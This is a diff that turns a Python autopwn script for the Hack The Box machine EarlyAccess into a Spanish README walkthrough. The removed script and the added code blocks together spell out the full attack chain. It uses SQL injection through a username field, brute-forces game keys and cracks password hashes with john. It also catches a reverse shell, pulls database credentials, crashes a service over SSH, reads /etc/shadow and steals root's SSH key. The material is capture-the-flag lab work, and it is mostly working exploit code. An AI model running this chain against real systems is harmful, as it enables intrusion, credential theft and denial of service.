@@ -1,100 +1,23 @@
-#!/usr/bin/python3
-import pexpect
-import paramiko
-import requests
-import time
-from pwn import *
-import pdb
-import sys
-import json
-from itertools import product
-import multiprocessing
+# Autopwn - EarlyAccess
+
+En caso de no haber realizado la máquina EarlyAccess, es recomendable revisar el [writeup](https://mrpr1ngl3s.github.io/htb/EarlyAccess) para comprender el autopwn.
+
+<p align="center">
+	<img src="Img/Autopwn-EarlyAccess.png"
+		alt="autopwn"
+	style="float: left; margin-right: 10px;" />
+</p>
 
 
+# Funcionamiento
 
-requests.packages.urllib3.disable_warnings()
+El primer paso que que realiza el script es en la creación y la modificación del usuario, para ello accede a la función **Register** obteniendo primero el token para la creación del usuario utilizando el **session** para que el token no cambie entre solicitudes.
 
-# Variables Globales
-name = "pr1ngl3s"
-email = "pr1ngl3s@pr1ngl3s.com"
-password = "pr1ngl3s123"
-password2 = "pr1ngl3s123"
-url_login = "https://earlyaccess.htb/login"
-url_key = "https://earlyaccess.htb/key"
-
-
+```python
 s = requests.session()
+```
 
-
-r = s.get(url_login, verify=False)
-
-token = re.findall('name="_token" value="(.*?)"',r.text)[0]
-
-def calc_g3():
-	r = product(string.ascii_uppercase, repeat=2)
-
-	r2 = [ "".join(x) for x in r ]
-
-
-	com = {}
-
-	for x in r2:
-		for i in range(0,10):
-			key = f"XP{x}{i}"
-
-			value = sum(bytearray(key.encode()))
-
-			com[value] = key
-
-	return com.values()
-
-
-def checksum_calc(key):
-	gs = key.split('-')[:]
-	return sum([sum(bytearray(g.encode())) for g in gs])
-
-def Key_Gen():
-	values = calc_g3()
-
-	total_keys = []
-
-	for x in values:
-		key = f"KEY98-KY5Z3-{x}-GAML8-"
-		cs = checksum_calc(key)
-		key = key + str(cs)
-
-		total_keys.append(key)
-
-	try_keys(total_keys)
-
-def try_keys(keys):
-
-	key_verify_url = "https://earlyaccess.htb/key/add"
-
-	cont = 1
-
-	for key in keys:
-
-		url_token = "https://earlyaccess.htb/login"
-
-		r = s.get(url_key, verify=False)
-
-		token = re.findall('name="_token" value="(.*?)"',r.text)[0]
-
-		data_post = {
-			'_token': token,
-			'key': key
-		}
-
-		r = s.post(key_verify_url, verify=False, data=data_post)
-
-#		time.sleep(1)
-
-		if "Game-key is invalid!" not in r.text:
-			break
-
-		cont += 1
-
+```python
 def Register():
 
 	url_register = "https://earlyaccess.htb/register"
@@ -112,8 +35,11 @@ def Register():
 	}
 
 	r = s.post(url_register, data=data_post, verify=False)
+```
 
+Luego, tras la creación del usuario, con la función **Login** obtiene la sesión del usuario.
 
+```python
 def Login():
 	url_login = "https://earlyaccess.htb/login"
 
@@ -124,7 +50,12 @@ def Login():
 	}
 
 	r = s.post(url_login, data=data_post, verify=False)
+```
 
+
+
+Para luego utilizar la función **Update_name** con la cual realiza la modificación del nombre de usuario para el SQLi, además los datos se envían en formato **JSON** por lo que se utilizó la librería **json** para convertir los datos a **JSON**, pero para realzar el cambio de nombre se tuvo que primero obtener datos necesarios para la modificación, como por ejemplo los valores **token**, **htmlHash**, **checksum** etc, ya que por cada petición los valores iban cambiando.
+```python
 def Update_name(old_name,new_name):
 	url_update = "https://earlyaccess.htb/livewire/message/profile.update-profile-information-form"
 
@@ -194,8 +125,82 @@ def Update_name(old_name,new_name):
 	}
 
 	r = s.post(url_update, data=json.dumps(data_post),headers=headers, verify=False)
+```
+Luego para acceder al subdominio **dev** se ejecuto la función **Key_Gen** el cual genera la clave necesaria para luego enviarla, y así acceder al subdominio.
 
 
+```python
+def calc_g3():
+	r = product(string.ascii_uppercase, repeat=2)
+
+	r2 = [ "".join(x) for x in r ]
+
+
+	com = {}
+
+	for x in r2:
+		for i in range(0,10):
+			key = f"XP{x}{i}"
+
+			value = sum(bytearray(key.encode()))
+
+			com[value] = key
+
+	return com.values()
+
+
+def checksum_calc(key):
+	gs = key.split('-')[:]
+	return sum([sum(bytearray(g.encode())) for g in gs])
+
+def Key_Gen():
+	values = calc_g3()
+
+	total_keys = []
+
+	for x in values:
+		key = f"KEY98-KY5Z3-{x}-GAML8-"
+		cs = checksum_calc(key)
+		key = key + str(cs)
+
+		total_keys.append(key)
+
+	try_keys(total_keys)
+
+def try_keys(keys):
+
+	key_verify_url = "https://earlyaccess.htb/key/add"
+
+	cont = 1
+
+	for key in keys:
+
+		url_token = "https://earlyaccess.htb/login"
+
+		r = s.get(url_key, verify=False)
+
+		token = re.findall('name="_token" value="(.*?)"',r.text)[0]
+
+		data_post = {
+			'_token': token,
+			'key': key
+		}
+
+		r = s.post(key_verify_url, verify=False, data=data_post)
+
+		if "Game-key is invalid!" not in r.text:
+			break
+
+		cont += 1
+```
+
+Seguido de esto, con la función **GetPassAdmin** acceede al subdominio utilizando de nuevo el **session** para que la sesión no cambie, y así envia una petición por GET para crear un puntuación y así poder acceder al marcado y obtener el **hash** del usuario **admin**, con la cual mediante la función **crack_hash** meterla en un archivo, y ejecutando la herramienta **john** realiza el crackeo del hash para obtener la contraseña y guardarla en la variable **pass_admin**.
+
+```python
+pass_admin = GetPassAdmin()
+```
+
+```python
 def GetPassAdmin():
 
 	url_game_login = "http://game.earlyaccess.htb/actions/login.php"
@@ -233,7 +238,17 @@ def crack_hash(hash):
 		Pass = file.read()
 
 	return Pass.replace('\n','')
+```
 
+Con la contraseña ya obtenida, accede al panel de login del usuario admin con la funcón **Login_admin**, para guardar la sesión y con la función **SendShell** la cual esta jugando con la libreria **multiprocessing** para utilizar hilos y envía la ReverseShell estando en escucha en la función **Get_Shell**. 
+
+```python
+Login_admin(pass_admin)
+
+multiprocessing.Process(target=Send_Shell).start()
+```
+
+```python
 def Login_admin(pass_admin):
 	url_login_admin = "http://dev.earlyaccess.htb/actions/login.php"
 
@@ -256,8 +271,15 @@ def Send_Shell():
 	}
 
 	r = s.post(url_hash, data=data_post)
+```
 
+En la función **Get_Shell** tras recibir la ReverseShell envía el contenido del archivo que contiene la contraseña del usuario **dew** usando **recv** para recibir los datos en fragmentos con los cuales luego crear un archivo que contendra esos datos.
 
+```python
+Get_Shell()
+```
+
+```python
 def Get_Shell():
 	with listen('443', timeout=20) as shell:
 		shell.sendline("cd /tmp".encode('utf-8'))
@@ -268,8 +290,6 @@ def Get_Shell():
 		time.sleep(1)
 		shell.sendline("cat check_db".encode('utf-8'))
 
-
-		# Usar recv() en un bucle para recibir datos en fragmentos hasta que se reciba toda la información necesaria.
 		datos_recibidos = b""
 
 		while True:
@@ -280,7 +300,16 @@ def Get_Shell():
 
 		with open('check_db', 'wb') as f:
 			f.write(datos_recibidos)
+```
 
+Con el archivo ya creado, en la función **Get_Credentials** utilizando la libreria **re** obtiene mediante expresiónes regulares el nombre de usuario y la contraseña guardandolas en las variables **User_drew** y **Pass_drew**.
+
+
+```python
+User_drew, Pass_drew = Get_Credentials()
+```
+
+```python
 def Get_Credentials():
 
 	with open('check_db', 'r') as file:
@@ -289,8 +318,14 @@ def Get_Credentials():
 	os.remove("check_db")
 
 	return	re.findall(r'\"MYSQL_USER=(.*?)\"', check_db)[0],re.findall(r'\"MYSQL_ROOT_PASSWORD=(.*?)\"', check_db)[0]
+```
 
+Teniendo ya las credenciales,accede via SSH como el usuario **drew** y realiza un bucle a la montura del contenedor, el cual crea un archivo que le da permisos de ejecución al **/etc/shadow**.
 
+```python
+multiprocessing.Process(args=(User_drew,Pass_drew,),target=Drew).start()
+```
+```python
 def Drew(username,password):
 	client = paramiko.SSHClient()
 
@@ -303,7 +338,16 @@ def Drew(username,password):
 	sleep(10)
 
 	client.close()
+```
 
+Mientras en la función **Game_Tester** accede vía SSH para luego como el usuario **game-tester** realizar la caída del servidor.
+
+
+```python
+Game_Tester2(User_drew, Pass_drew)
+```
+
+```python
 def Game_Tester2(username,password):
 	client = paramiko.SSHClient()
 	client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
@@ -312,6 +356,11 @@ def Game_Tester2(username,password):
 
 	stdin, stdout, stderr = client.exec_command('ssh -o StrictHostKeyChecking=no game-tester@$(for x in $(seq 2 254); do ((ping -c 1 172.19.0.$x 1>/dev/null) && echo '' > /dev/tcp/172.19.0.$x/22 && echo "172.19.0.$x" &); done 2>/dev/null) "curl http://127.0.0.1:9999/autoplay -d \'rounds=-1\'"')
 
+```
+
+Con el contenedor ya reiniciado, en la función **Get_Hash_Adm** obtiene el hash del usuario **game-adm** accediendo al **/etc/shadow/** y guardandola en un archivo, para luego rompearla con la herramienta **john**.
+
+```python
 def Get_Hash_Adm(username,password):
 	client = paramiko.SSHClient()
 	client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
@@ -326,8 +375,19 @@ def Get_Hash_Adm(username,password):
             f.write(Hash_Adm)
 
 	client.close()
+```
 
+```python
+os.system("john -w=/usr/share/wordlists/rockyou.txt hash_adm > pass 2>/dev/null; cat pass | grep \"(?)\" | cut -d' ' -f1 | sponge pass")
+```
 
+Finalmente en la función **GetID_RSA** obtiene la clave privada el usuario **root**, pero para evitar problemas se codificó la obtención del id_rsa en base64 para luego ejecutarla.
+
+```python
+GetID_RSA(User_drew, Pass_drew, "game-adm", Pass_Adm)
+```
+
+```python
 def GetID_RSA(username,password, username_adm, password_adm):
 	client = paramiko.SSHClient()
 	client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
@@ -342,75 +402,15 @@ def GetID_RSA(username,password, username_adm, password_adm):
 
 	with open('id_rsa', 'w') as f:
             f.write(id_rsa)
+```
 
+Y asi con la clave ya obtenida, utilizando la función **GetRoot_Shell** accede como el usuario **root**.
 
+```
 def GetRoot_Shell():
 	ssh_command = "ssh -i id_rsa root@10.10.11.110"
 
 	ssh_session = pexpect.spawn(ssh_command, timeout=None)
 
 	ssh_session.interact()
-
-
-if __name__ == "__main__":
-
-	log.info("Crackeando el hash del usuario 'admin'...")
-
-	Register()
-
-	Login()
-
-	Update_name("pr1ngl3s","') union select name,email,password from users-- -")
-
-	Key_Gen()
-
-	pass_admin = GetPassAdmin()
-
-	os.remove("hash")
-
-	os.remove("pass")
-
-	os.remove("/root/.john/john.log")
-
-	os.remove("/root/.john/john.pot")
-
-	Login_admin(pass_admin)
-
-	multiprocessing.Process(target=Send_Shell).start()
-
-	log.info("Obteniendo la contraseña del usuario 'drew'...")
-
-	Get_Shell()
-
-	User_drew, Pass_drew = Get_Credentials()
-
-	multiprocessing.Process(args=(User_drew,Pass_drew,),target=Drew).start()
-
-	Game_Tester2(User_drew, Pass_drew)
-
-	time.sleep(40)
-
-	log.info("Crackeando la contraseña del usuario 'game-adm'...")
-
-	Get_Hash_Adm(User_drew, Pass_drew)
-
-	os.system("john -w=/usr/share/wordlists/rockyou.txt hash_adm > pass 2>/dev/null; cat pass | grep \"(?)\" | cut -d' ' -f1 | sponge pass")
-
-	with open('pass', 'r') as file:
-		Pass_Adm = file.read()
-
-	os.remove("hash_adm")
-
-	os.remove("pass")
-
-	log.info("Obteniendo la clave privada del usuario 'root'...")
-
-	GetID_RSA(User_drew, Pass_drew, "game-adm", Pass_Adm)
-
-	os.system('chmod 600 id_rsa')
-
-	GetRoot_Shell()
-
-	os.remove('id_rsa')
-
-
+```
